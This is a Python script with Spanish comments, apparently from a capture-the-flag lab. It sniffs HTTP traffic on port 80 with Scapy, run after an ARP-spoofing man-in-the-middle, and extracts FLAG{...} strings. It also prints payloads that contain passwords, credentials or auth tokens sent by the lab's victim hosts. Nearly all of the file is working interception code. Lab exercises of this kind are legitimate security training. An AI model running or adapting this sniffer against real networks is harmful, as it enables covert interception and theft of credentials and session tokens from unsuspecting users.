#!/usr/bin/env python3
"""
=============================================================================
Capture Flags - Sniffer de trafico para extraccion de flags
=============================================================================
Este script captura trafico HTTP en la red y extrae automaticamente
las flags del CTF de los paquetes interceptados.

COMO FUNCIONA:
  1. El atacante primero ejecuta arp_spoof.py para posicionarse como MITM
  2. Este script escucha el trafico HTTP que pasa por la interfaz
  3. Analiza los paquetes buscando patrones de flags (FLAG{...})
  4. Muestra las flags encontradas y opcionalmente las guarda

FLAGS EN EL LAB:
  - Flag 1 (Victim1): Oculta en comentario HTML de la pagina principal
  - Flag 2 (Victim2): En /backup/db_credentials.txt como password
  - Flag 3 (Victim3): Enviada periodicamente al gateway como auth_token

PRE-REQUISITO: Ejecutar ARP Spoofing primero:
  # En una terminal:
  python3 arp_spoof.py -t 172.20.0.10 -g 172.20.0.2

  # En otra terminal:
  python3 capture_flags.py

EJEMPLO DE USO:
  # Capturar flags de todo el trafico HTTP
  python3 capture_flags.py

  # Filtrar por IP especifica
  python3 capture_flags.py --filter-ip 172.20.0.12

  # Guardar flags encontradas en archivo
  python3 capture_flags.py -o flags_encontradas.txt

  # Capturar por tiempo limitado (60 segundos)
  python3 capture_flags.py --timeout 60

REQUISITOS:
  - Privilegios root (NET_RAW)
  - ARP Spoofing activo (MITM) o acceso al segmento de red
  - Scapy instalado
=============================================================================
"""

import argparse
import re
import sys
import time
import signal
from datetime import datetime
from scapy.all import sniff, IP, TCP, Raw, conf


# Patron para detectar flags del CTF
FLAG_PATTERN = re.compile(r"FLAG\{[^}]+\}")


class FlagCapture:
    """Clase que gestiona la captura y almacenamiento de flags."""

    def __init__(self, filter_ip=None, output_file=None):
        self.flags_found = set()      # Flags unicas encontradas
        self.filter_ip = filter_ip    # Filtrar por IP especifica
        self.output_file = output_file
        self.pkt_count = 0            # Paquetes procesados
        self.http_count = 0           # Paquetes HTTP encontrados

    def process_packet(self, pkt):
        """
        Callback que Scapy llama por cada paquete capturado.

        Analiza paquetes TCP con payload (Raw) buscando:
        1. Trafico HTTP (puerto 80)
        2. Patrones de flags (FLAG{...})
        3. Contenido interesante (credenciales, tokens)
        """
        self.pkt_count += 1

        # Solo procesar paquetes IP + TCP con datos
        if not pkt.haslayer(IP) or not pkt.haslayer(TCP) or not pkt.haslayer(Raw):
            return

        ip_layer = pkt[IP]
        tcp_layer = pkt[TCP]

        # Filtrar por IP si se especifico
        if self.filter_ip:
            if ip_layer.src != self.filter_ip and ip_layer.dst != self.filter_ip:
                return

        # Solo trafico HTTP (puerto 80)
        if tcp_layer.sport != 80 and tcp_layer.dport != 80:
            return

        self.http_count += 1

        # Extraer payload como texto
        try:
            payload = pkt[Raw].load.decode("utf-8", errors="ignore")
        except Exception:
            return

        # Buscar flags en el payload
        flags = FLAG_PATTERN.findall(payload)
        for flag in flags:
            if flag not in self.flags_found:
                self.flags_found.add(flag)
                timestamp = datetime.now().strftime("%H:%M:%S")
                src = ip_layer.src
                dst = ip_layer.dst

                print(f"\n{'='*60}")
                print(f"  FLAG ENCONTRADA!")
                print(f"{'='*60}")
                print(f"  Flag:    {flag}")
                print(f"  Origen:  {src}:{tcp_layer.sport}")
                print(f"  Destino: {dst}:{tcp_layer.dport}")
                print(f"  Hora:    {timestamp}")
                print(f"{'='*60}\n")

                if self.output_file:
                    self._save_flag(flag, src, dst, timestamp)

        # Mostrar contenido HTTP interesante (aunque no tenga flag)
        interesting_keywords = ["password", "credential", "auth_token",
                                "SECURITY_REPORT", "db_credentials"]
        payload_lower = payload.lower()
        for keyword in interesting_keywords:
            if keyword.lower() in payload_lower and not flags:
                print(f"\n[!] Contenido interesante detectado ({keyword}):")
                print(f"    {ip_layer.src} -> {ip_layer.dst}")
                # Mostrar solo las primeras lineas relevantes
                for line in payload.split("\n")[:10]:
                    if line.strip():
                        print(f"    | {line.strip()}")
                break

    def _save_flag(self, flag, src, dst, timestamp):
        """Guarda una flag encontrada en archivo."""
        try:
            with open(self.output_file, "a") as f:
                f.write(f"[{timestamp}] {flag} (src={src}, dst={dst})\n")
            print(f"[+] Flag guardada en {self.output_file}")
        except Exception as e:
            print(f"[!] Error guardando flag: {e}")

    def print_summary(self):
        """Muestra resumen de la captura."""
        print(f"\n{'='*60}")
        print(f"  Resumen de Captura")
        print(f"{'='*60}")
        print(f"  Paquetes procesados: {self.pkt_count}")
        print(f"  Paquetes HTTP:       {self.http_count}")
        print(f"  Flags encontradas:   {len(self.flags_found)}")
        if self.flags_found:
            print(f"\n  Flags:")
            for i, flag in enumerate(self.flags_found, 1):
                print(f"    {i}. {flag}")
        else:
            print(f"\n  No se encontraron flags.")
            print(f"  Asegurate de tener ARP Spoofing activo:")
            print(f"    python3 arp_spoof.py -t <victim_ip> -g 172.20.0.2")
        print(f"{'='*60}")


def main():
    parser = argparse.ArgumentParser(
        description="Sniffer de trafico para extraccion de flags del CTF",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Ejemplos:
  # Capturar flags (requiere MITM activo)
  python3 capture_flags.py

  # Filtrar trafico de victim3 (reportes periodicos)
  python3 capture_flags.py --filter-ip 172.20.0.12

  # Guardar flags en archivo
  python3 capture_flags.py -o flags.txt

  # Capturar por 120 segundos
  python3 capture_flags.py --timeout 120
        """
    )
    parser.add_argument("-i", "--interface", default="eth0",
                        help="Interfaz de red (default: eth0)")
    parser.add_argument("--filter-ip", default=None,
                        help="Filtrar trafico por IP especifica")
    parser.add_argument("-o", "--output", default=None,
                        help="Archivo donde guardar las flags encontradas")
    parser.add_argument("--timeout", type=int, default=0,
                        help="Tiempo de captura en segundos (0 = indefinido)")
    args = parser.parse_args()

    print("=" * 60)
    print("  Flag Capture - HTTP Traffic Sniffer")
    print("=" * 60)
    print(f"  Interface:  {args.interface}")
    print(f"  Filtro IP:  {args.filter_ip or 'Ninguno (todo el trafico)'}")
    print(f"  Timeout:    {args.timeout or 'Indefinido (Ctrl+C para detener)'}")
    print(f"  Output:     {args.output or 'Solo consola'}")
    print("=" * 60)
    print(f"\n[*] Capturando trafico HTTP... (Ctrl+C para detener)\n")

    capturer = FlagCapture(
        filter_ip=args.filter_ip,
        output_file=args.output
    )

    # BPF filter: solo trafico TCP puerto 80 (HTTP)
    bpf_filter = "tcp port 80"

    try:
        sniff(
            iface=args.interface,
            filter=bpf_filter,
            prn=capturer.process_packet,
            store=False,  # No almacenar paquetes en memoria
            timeout=args.timeout if args.timeout > 0 else None
        )
    except KeyboardInterrupt:
        pass
    except PermissionError:
        print("[!] Error: Se requieren privilegios root")
        print("[!] Ejecuta con: sudo python3 capture_flags.py")
        sys.exit(1)

    capturer.print_summary()


if __name__ == "__main__":
    main()
